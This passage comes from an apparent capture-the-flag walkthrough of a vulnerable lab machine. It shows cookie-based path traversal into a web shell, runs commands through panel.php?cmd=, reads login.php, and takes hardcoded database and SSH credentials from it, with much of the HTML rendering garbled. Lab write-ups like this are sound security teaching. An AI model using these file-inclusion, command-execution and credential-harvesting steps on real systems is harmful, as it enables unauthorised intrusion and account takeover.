</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/hell# cat cookies&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>Netscape HTTP Cookie File&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>&lt;a href="http://curl.haxx.se/rfc/cookie_spec.html">http://curl.haxx.se/rfc/cookie_spec.html&lt;/a>&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>This file was generated by libcurl! Edit at your own risk.&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>10.10.10.146    FALSE   /   FALSE   0   PHPSESSID   cb11eurq57no9kbu8k09pvt0d5
</span><span class='line'>10.10.10.146    FALSE   /super_secret_login_path_muhahaha/  FALSE   0   failcount   3
</span><span class='line'>10.10.10.146    FALSE   /super_secret_login_path_muhahaha/  FALSE   0   intruder    1</span></code></pre></td></tr></table></div></figure></p>

<p>Then I change the value of cookie <code>intruder</code> to include our webshell file: <code>/tmp/note.txt</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# cat cookies<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;h1&gt;</span>Netscape HTTP Cookie File<span class="nt">&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;h1&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://curl.haxx.se/rfc/cookie_spec.html&quot;</span><span class="nt">&gt;</span>http://curl.haxx.se/rfc/cookie_spec.html<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;h1&gt;</span>This file was generated by libcurl! Edit at your own risk.<span class="nt">&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>10.10.10.146    FALSE   /   FALSE   0   PHPSESSID   cb11eurq57no9kbu8k09pvt0d5
</span><span class='line'>10.10.10.146    FALSE   /super_secret_login_path_muhahaha/  FALSE   0   failcount   3
</span><span class='line'>10.10.10.146    FALSE   /super_secret_login_path_muhahaha/  FALSE   0   intruder    <span class="ni">&amp;hellip;</span>.//<span class="ni">&amp;hellip;</span>.//<span class="ni">&amp;hellip;</span>.//<span class="ni">&amp;hellip;</span>.//<span class="ni">&amp;hellip;</span>.//<span class="ni">&amp;hellip;</span>.//tmp//note.txt
</span><span class='line'>root@kali:~/hell# curl -v <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=id&quot;</span><span class="nt">&gt;</span>http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=id<span class="nt">&lt;/a&gt;</span> -c cookies -b cookies
</span><span class='line'>* About to connect() to 10.10.10.146 port 80 (#0)
</span><span class='line'>*   Trying 10.10.10.146<span class="ni">&amp;hellip;</span>
</span><span class='line'>* connected
</span><span class='line'>* Connected to 10.10.10.146 (10.10.10.146) port 80 (#0)<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;blockquote&gt;&lt;p&gt;</span>GET /super_secret_login_path_muhahaha/panel.php?cmd=id HTTP/1.1
</span><span class='line'>User-Agent: curl/7.26.0
</span><span class='line'>Host: 10.10.10.146
</span><span class='line'>Accept: <span class="nt">&lt;em&gt;</span>/<span class="nt">&lt;/em&gt;</span>
</span><span class='line'>Cookie: intruder=<span class="ni">&amp;hellip;</span>.//<span class="ni">&amp;hellip;</span>.//<span class="ni">&amp;hellip;</span>.//<span class="ni">&amp;hellip;</span>.//<span class="ni">&amp;hellip;</span>.//<span class="ni">&amp;hellip;</span>.//tmp//note.txt; failcount=3; PHPSESSID=cb11eurq57no9kbu8k09pvt0d5<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;ul&gt;</span>
</span><span class='line'><span class="nt">&lt;li&gt;</span>additional stuff not fine transfer.c:1037: 0 0<span class="nt">&lt;/li&gt;</span>
</span><span class='line'><span class="nt">&lt;li&gt;</span>HTTP 1.1 or later with persistent connection, pipelining supported
</span><span class='line'><span class="ni">&amp;lt;</span> HTTP/1.1 302 Found
</span><span class='line'><span class="ni">&amp;lt;</span> Date: Wed, 15 Jul 2015 00:16:47 GMT
</span><span class='line'><span class="ni">&amp;lt;</span> Server: Apache/2.2.22 (Debian)
</span><span class='line'><span class="ni">&amp;lt;</span> X-Powered-By: PHP/5.4.4-14+deb7u11
</span><span class='line'><span class="ni">&amp;lt;</span> Expires: Thu, 19 Nov 1981 08:52:00 GMT
</span><span class='line'><span class="ni">&amp;lt;</span> Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
</span><span class='line'><span class="ni">&amp;lt;</span> Pragma: no-cache
</span><span class='line'><span class="ni">&amp;lt;</span> Location: index.php
</span><span class='line'><span class="ni">&amp;lt;</span> Vary: Accept-Encoding
</span><span class='line'><span class="ni">&amp;lt;</span> Content-Length: 620
</span><span class='line'><span class="ni">&amp;lt;</span> Content-Type: text/html
</span><span class='line'><span class="ni">&amp;lt;</span><span class="nt">&lt;/li&gt;</span>
</span><span class='line'><span class="nt">&lt;/ul&gt;</span>
</span><span class='line'><span class="nt">&lt;/blockquote&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;&lt;HTML&gt;</span>
</span><span class='line'><span class="nt">&lt;CENTRE&gt;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;H2&gt;</span> Folders <span class="nt">&lt;/H2&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;&lt;TABLE</span> <span class="na">style=</span><span class="s">&quot;width:700px&quot;</span> <span class="na">align=</span><span class="s">&quot;center&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;server.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;mail.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;users.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;personal.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;notes.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Server Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Mail Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Auth Users<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Personal Folder<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Notes<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;/CENTRE&gt;</span>
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'><span class="nt">&lt;/HTML&gt;</span>
</span><span class='line'>* Connection #0 to host 10.10.10.146 left intact
</span><span class='line'>* Closing connection #0
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# curl <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=ls+-l+/home&quot;</span><span class="nt">&gt;</span>http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=ls+-l+/home<span class="nt">&lt;/a&gt;</span> -c cookies -b cookies<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;&lt;HTML&gt;</span>
</span><span class='line'><span class="nt">&lt;CENTRE&gt;</span>
</span><span class='line'><span class="nt">&lt;H2&gt;</span> Folders <span class="nt">&lt;/H2&gt;</span>
</span><span class='line'><span class="nt">&lt;TABLE</span> <span class="na">style=</span><span class="s">&quot;width:700px&quot;</span> <span class="na">align=</span><span class="s">&quot;center&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;server.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;mail.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;users.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;personal.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;notes.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Server Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Mail Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Auth Users<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Personal Folder<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Notes<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;/CENTRE&gt;</span>
</span><span class='line'>total 20
</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span> 3 bazza       bazza       4096 Jul 13 01:43 bazza
</span><span class='line'>drwx<span class="ni">&amp;ndash;</span>x<span class="ni">&amp;ndash;</span>x 3 george      george      4096 Jul 12 07:27 george
</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span> 5 jack        jack        4096 Jul 12 05:28 jack
</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span> 2 milk_4_life milk_4_life 4096 Jul 12 06:59 milk_4_life
</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span> 2 oj          oj          4096 Jul 14 01:49 oj
</span><span class='line'><span class="nt">&lt;/HTML&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Here we can see there are 5 users under folder <code>/home</code>: <strong>bazza</strong>, <strong>george</strong>, <strong>jack</strong>, <strong>milk_4_life</strong> and <strong>oj</strong></p>

<h2>Moving to <strong>jack</strong></h2>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# curl <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=ls+-l+/var/www/&quot;</span><span class="nt">&gt;</span>http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=ls+-l+/var/www/<span class="nt">&lt;/a&gt;</span> -c cookies -b cookies<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;&lt;HTML&gt;</span>
</span><span class='line'><span class="nt">&lt;CENTRE&gt;</span>
</span><span class='line'><span class="nt">&lt;H2&gt;</span> Folders <span class="nt">&lt;/H2&gt;</span>
</span><span class='line'><span class="nt">&lt;TABLE</span> <span class="na">style=</span><span class="s">&quot;width:700px&quot;</span> <span class="na">align=</span><span class="s">&quot;center&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;server.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;mail.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;users.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;personal.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;notes.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Server Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Mail Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Auth Users<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Personal Folder<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Notes<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;/CENTRE&gt;</span>
</span><span class='line'>total 112
</span><span class='line'>-rw-r<span class="ni">&amp;ndash;</span>r<span class="ni">&amp;ndash;</span> 1 www-data www-data 87841 Jun 17  2014 comic.png
</span><span class='line'>-rwxr<span class="ni">&amp;ndash;</span>r<span class="ni">&amp;ndash;</span> 1 www-data www-data  7846 Jun 20  2014 echoserver.bak
</span><span class='line'>-rw-r<span class="ni">&amp;ndash;</span>r<span class="ni">&amp;ndash;</span> 1 www-data www-data   466 Jun 20  2014 index.html
</span><span class='line'>drwxr-xr-x 2 www-data www-data  4096 Jun 20  2014 personal
</span><span class='line'>-rw-r<span class="ni">&amp;ndash;</span>r<span class="ni">&amp;ndash;</span> 1 www-data www-data    80 Jun 17  2014 robots.txt
</span><span class='line'>drwxr-xr-x 2 www-data www-data  4096 Jul 13 05:32 super_secret_login_path_muhahaha
</span><span class='line'><span class="nt">&lt;/HTML&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Here I found some sensitive information in <code>login.php</code> file.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# curl <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=cat+login.php&quot;</span><span class="nt">&gt;</span>http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=cat+login.php<span class="nt">&lt;/a&gt;</span> -c cookies -b cookies<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;&lt;HTML&gt;</span>
</span><span class='line'><span class="nt">&lt;CENTRE&gt;</span>
</span><span class='line'><span class="nt">&lt;H2&gt;</span> Folders <span class="nt">&lt;/H2&gt;</span>
</span><span class='line'><span class="nt">&lt;TABLE</span> <span class="na">style=</span><span class="s">&quot;width:700px&quot;</span> <span class="na">align=</span><span class="s">&quot;center&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;server.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;mail.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;users.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;personal.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;notes.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Server Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Mail Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Auth Users<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Personal Folder<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Notes<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;/CENTRE&gt;</span>
</span><span class='line'><span class="ni">&amp;lt;</span>?PHP
</span><span class='line'>session_start();<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>function login(){<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;pre&gt;&lt;code&gt;</span>$username = mysql_escape_string($_POST[&quot;username&quot;]);
</span><span class='line'>$password = mysql_escape_string($_POST[&quot;password&quot;]);
</span><span class='line'>// mysql_connect(&quot;127.0.0.1&quot;, &quot;Jack&quot;, &quot;zgcR6mU6pX&quot;) or die (&quot;Server Error&quot;); I&#39;ll change this back once development is done. Got sick of typing my password.
</span><span class='line'>mysql_connect(&quot;127.0.0.1&quot;, &quot;www-data&quot;, &quot;website&quot;) or die(&quot;Server Error&quot;);
</span><span class='line'>mysql_select_db(&quot;website&quot;) or die(&quot;Server Error&quot;);
</span><span class='line'>$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;
</span><span class='line'>$res = mysql_query($sql) or die(&quot;Server Error&quot;);
</span><span class='line'>$row = mysql_fetch_row($res);
</span><span class='line'>if ($row[0]) {
</span><span class='line'>    return 1;
</span><span class='line'>} else {
</span><span class='line'>    return 0;
</span><span class='line'>}
</span><span class='line'><span class="nt">&lt;/code&gt;&lt;/pre&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>}<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>if (login()) {
</span><span class='line'>    $_SESSION[<span class="ni">&amp;ldquo;</span>valid<span class="ni">&amp;rdquo;</span>] = 1;
</span><span class='line'>    setcookie(time()+600);
</span><span class='line'>    header(<span class="ni">&amp;lsquo;</span>Location: index.php<span class="ni">&amp;rsquo;</span>);
</span><span class='line'>} else {
</span><span class='line'>    header(<span class="ni">&amp;lsquo;</span>Location: index.php?the_user_is_a_failure=1<span class="ni">&amp;rsquo;</span>);
</span><span class='line'>}
</span><span class='line'>?&gt;
</span><span class='line'><span class="nt">&lt;/HTML&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>From the comment, I got credential: <em><font color="red">jack</font> / <font color="red">zgcR6mU6pX</font></em>
I also got mysql&rsquo;s login credential is <em><font color="red">www-data</font> / <font color="red">website</font></em></p>

<p>Trying SSH login as jack with discovered password and it works! Now I am jack.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
